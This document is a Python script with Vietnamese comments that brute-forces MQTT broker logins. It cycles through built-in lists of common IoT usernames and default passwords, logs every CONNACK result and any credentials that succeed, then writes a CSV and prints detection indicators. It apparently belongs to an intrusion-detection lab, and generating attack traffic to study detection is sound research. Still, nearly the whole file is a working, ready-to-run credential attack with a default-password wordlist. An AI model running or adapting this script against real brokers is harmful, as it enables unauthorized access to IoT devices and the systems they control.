#!/usr/bin/env python3
"""
Attack 3 — MQTT Brute Force CONNECT
Thử nhiều username/password liên tục đến broker.
Ghi lại số lần CONNACK refused để phân tích detection.

Chạy:
    python3 attack3_brute_force.py --host 10.0.0.10 --port 1883 --delay 0.1
"""

import paho.mqtt.client as mqtt
import time
import argparse
import itertools
import logging
import csv
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s — %(message)s"
)
log = logging.getLogger(__name__)

# ── Wordlist mật khẩu phổ biến IoT ────────────────────────────────────────────
USERNAMES = [
    "admin", "root", "user", "guest", "mqtt",
    "iot", "device", "sensor", "broker", "test",
    "pi", "ubuntu", "operator", "manager", "support",
]

PASSWORDS = [
    "admin", "password", "123456", "root", "1234",
    "qwerty", "letmein", "welcome", "iot123", "mqtt",
    "raspberry", "default", "admin123", "pass", "test",
    "secret", "12345678", "abc123", "device", "sensor",
]

# ── Kết quả CONNACK ────────────────────────────────────────────────────────────
CONNACK_CODES = {
    0: "ACCEPTED",
    1: "REFUSED — Bad protocol",
    2: "REFUSED — Client ID rejected",
    3: "REFUSED — Server unavailable",
    4: "REFUSED — Bad credentials",
    5: "REFUSED — Not authorised",
}


def try_login(host: str, port: int, username: str, password: str,
              timeout: float = 2.0) -> tuple[int, float]:
    """Thử đăng nhập 1 lần, trả về (rc, elapsed_ms)"""
    result_code = [-1]
    connected   = [False]

    def on_connect(client, userdata, flags, rc):
        result_code[0] = rc
        connected[0]   = True

    client = mqtt.Client(client_id=f"brute-{username[:4]}-{int(time.time()*1000)%9999}")
    client.username_pw_set(username, password)
    client.on_connect = on_connect

    t0 = time.time()
    try:
        client.connect(host, port, keepalive=5)
        deadline = time.time() + timeout
        while not connected[0] and time.time() < deadline:
            client.loop(timeout=0.1)
    except Exception:
        result_code[0] = -1
    finally:
        try:
            client.disconnect()
        except Exception:
            pass

    elapsed = (time.time() - t0) * 1000
    return result_code[0], elapsed


def main():
    parser = argparse.ArgumentParser(description="MQTT Brute Force CONNECT")
    parser.add_argument("--host",    default="127.0.0.1",  help="IP broker MQTT")
    parser.add_argument("--port",    type=int, default=1883, help="Port broker")
    parser.add_argument("--delay",   type=float, default=0.2,
                        help="Delay giữa các lần thử (giây)")
    parser.add_argument("--max",     type=int, default=0,
                        help="Giới hạn số lần thử (0 = tất cả combinations)")
    args = parser.parse_args()

    combos = list(itertools.product(USERNAMES, PASSWORDS))
    if args.max > 0:
        combos = combos[:args.max]

    total      = len(combos)
    attempt    = 0
    success    = 0
    refused    = 0
    log_rows   = []
    start_time = time.time()

    log.info("=" * 60)
    log.info("  ATTACK 3 — MQTT BRUTE FORCE CONNECT")
    log.info(f"  Target       : {args.host}:{args.port}")
    log.info(f"  Combinations : {total}")
    log.info(f"  Delay        : {args.delay}s")
    log.info("=" * 60)

    found_creds = []

    for username, password in combos:
        attempt += 1
        rc, elapsed_ms = try_login(args.host, args.port, username, password)
        status  = CONNACK_CODES.get(rc, f"UNKNOWN (rc={rc})")

        log_rows.append({
            "attempt":    attempt,
            "username":   username,
            "password":   password,
            "rc":         rc,
            "status":     status,
            "elapsed_ms": f"{elapsed_ms:.1f}",
            "timestamp":  datetime.now().isoformat(),
        })

        if rc == 0:
            success += 1
            found_creds.append((username, password))
            log.info(f"[{attempt:>4}/{total}] ✅ THÀNH CÔNG! user={username} pass={password}")
        else:
            refused += 1
            log.info(f"[{attempt:>4}/{total}] ✗ {status} | user={username} pass={password} | {elapsed_ms:.0f}ms")

        if args.delay > 0:
            time.sleep(args.delay)

    # ── Kết quả ────────────────────────────────────────────────────────────────
    elapsed = time.time() - start_time
    rate    = attempt / elapsed if elapsed > 0 else 0

    log.info("=" * 60)
    log.info("  KẾT QUẢ BRUTE FORCE")
    log.info(f"  Tổng thử     : {attempt}")
    log.info(f"  Thành công   : {success}")
    log.info(f"  Từ chối      : {refused}")
    log.info(f"  Thời gian    : {elapsed:.1f}s  |  Tốc độ: {rate:.2f} req/s")
    if found_creds:
        log.info(f"  CREDENTIALS  : {found_creds}")
    log.info("=" * 60)

    # ── Ghi CSV ────────────────────────────────────────────────────────────────
    out_file = "attack3_bruteforce_log.csv"
    with open(out_file, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=log_rows[0].keys())
        writer.writeheader()
        writer.writerows(log_rows)
    log.info(f"  Log đã lưu → {out_file}")

    # ── Thống kê detect indicator ───────────────────────────────────────────────
    connect_rate = attempt / elapsed if elapsed > 0 else 0
    log.info("\n  [DETECTION INDICATORS]")
    log.info(f"  CONNECT rate     : {connect_rate:.2f}/s  (normal < 0.1/s)")
    log.info(f"  CONNACK refused% : {refused/attempt*100:.1f}%  (normal ≈ 0%)")
    log.info(f"  Unique users     : {len(USERNAMES)}  (suspicious nếu > 5)")


if __name__ == "__main__":
    main()
